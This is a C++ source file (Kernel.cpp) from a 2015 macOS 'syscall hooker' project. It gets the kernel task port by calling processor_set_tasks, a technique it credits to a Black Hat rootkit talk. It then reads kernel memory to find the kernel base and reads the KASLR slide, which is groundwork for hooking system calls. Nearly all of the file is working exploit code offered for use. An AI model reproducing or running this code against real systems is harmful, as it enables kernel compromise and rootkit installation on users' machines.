/*
 *
 *   ______________.___. __________________     _____  .____    .____
 *  /   _____/\__  |   |/   _____/\_   ___ \   /  _  \ |    |   |    |
 *  \_____  \  /   |   |\_____  \ /    \  \/  /  /_\  \|    |   |    |
 *  /        \ \____   |/        \\     \____/    |    \    |___|    |___
 * /_______  / / ______/_______  / \______  /\____|__  /_______ \_______ \
 * \/  \/              \/         \/         \/        \/       \/
 *   ___ ___ ________   ________   ____  __._____________________
 *  /   |   \\_____  \  \_____  \ |    |/ _|\_   _____/\______   \
 * /    ~    \/   |   \  /   |   \|      <   |    __)_  |       _/
 * \    Y    /    |    \/    |    \    |  \  |        \ |    |   \
 *  \___|_  /\_______  /\_______  /____|__ \/_______  / |____|_  /
 *
 * syscall hooker
 *
 *
 * (c) Will Yee, 2015 - will.yee@live.com
 *
 * Kernel.cpp
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include "includes/Kernel.h"

#include <mach/mach_init.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach-o/loader.h>

Kernel::Kernel()
: kernelPort(GetKernelPort())
, kernelBitness(KernelInfo::GetKernelBitness())
, kernInterface(kernelPort, KernelInfo::GetIDTAddress(), kernelBitness)
, kernelBase(GetKernelBaseFromKernel())
, kernelMajor(KernelInfo::GetKernelVersion())
, kaslrSlide(KernelInfo::GetKaslrSlide())
, isInGoodState(false)
{
    if (kernelPort != 0 &&
        kernelBase != 0 &&
        kernelBitness != 0 &&
        kernInterface.IsReady() == true)
    {
        isInGoodState = true;
    }
}

Kernel::~Kernel()
{
    
}

// Search for the kernel base, AKA the start of the mach-o header
tAddress Kernel::GetKernelBaseFromKernel()
{
    kResult result = KERN_FAILURE;
    tAddress tempKernelBase = 0;
    tAddress tempAddress = kernInterface.GetInt80Address();

    uint64_t length = INITIAL_STEP_VALUE;
    uint64_t tempStepValue = INITIAL_STEP_VALUE;
    uint8_t  tempBuffer[INITIAL_STEP_VALUE];
    
    // We only support 64 bit kernel
    if (kernelBitness == 64)
    {
        struct segment_command_64* segCommand = nullptr;
        while (tempAddress > 0 && tempKernelBase == 0)
        {
            result = kernInterface.ReadFromKernelMemory(tempBuffer, tempAddress, length);
            
            if (result == KERN_SUCCESS)
            {
                // Search the newly copied over buffer for the mach-o magic numbers
                for (uint32_t i = 0; i < length; ++i)
                {
                    uint32_t* pMagicNumber = reinterpret_cast<uint32_t*>(tempBuffer + i);
                    
                    if (pMagicNumber != nullptr && *pMagicNumber == MH_MAGIC_64)
                    {
                        // Check the first segment command is pointing to the __TEXT section.
                        // Possibly unsafe: malformed section name, or __TEXT section is not the first section
                        segCommand = reinterpret_cast<struct segment_command_64*>(tempBuffer + i + sizeof(mach_header_64));
                        
                        std::string sectionName = segCommand->segname;
                        
                        if (sectionName.find("__TEXT") != std::string::npos)
                        {
                            tempKernelBase = reinterpret_cast<uint64_t>(tempAddress + i);
                            break;
                        }
                    }
                }
                
                // verify if next block to be read is valid or not
                // adjust the step value to a smaller value so we can proceed
                while (tempKernelBase == 0 && kernInterface.ReadFromKernelMemory(tempBuffer, tempAddress - tempStepValue, length) != KERN_SUCCESS)
                {
                    tempStepValue = 1; // This value can be dynamically determined, but it would be a wasate of time, read the smallest amount so there is no overlap
                    
                    length = sizeof(struct mach_header_64) + sizeof(struct segment_command_64);
                }
                
                if (tempAddress - tempStepValue > tempAddress)
                {
                    break;
                }
                
                tempAddress -= tempStepValue;
            }
            else
            {
                break;
            }
        }
    }
    
    return tempKernelBase;
}

mach_port_t Kernel::GetKernelPort()
{
    // Attempts to use the vulnerability described in
    // "You Can't See Me: A Mac OSX RootKit Uses the Tricks You haven't Known Yet"
    // Presented at Blackhat Asia 2014 by Ming-chieh Pan and Sung-ting Tsai
    
    mach_port_t            port = 0;
    host_t                 hostPort = mach_host_self();
    mach_port_t            procSetDefault = 0;
    mach_port_t            procSetDefaultControl = 0;
    task_array_t           allTasks = nullptr;
    mach_msg_type_number_t allTaskCnt = 0;
    kern_return_t          result = 0;
    
    result = processor_set_default(hostPort, &procSetDefault);
    if (result == KERN_SUCCESS)
    {
        result = host_processor_set_priv(hostPort, procSetDefault, &procSetDefaultControl);
        if (result == KERN_SUCCESS)
        {
            result = processor_set_tasks(procSetDefaultControl, &allTasks, &allTaskCnt);
            if (result == KERN_SUCCESS)
            {
                if (allTaskCnt != 0)
                {
                    port = allTasks[0];
                }
            }
        }
    }
    
    return port;
}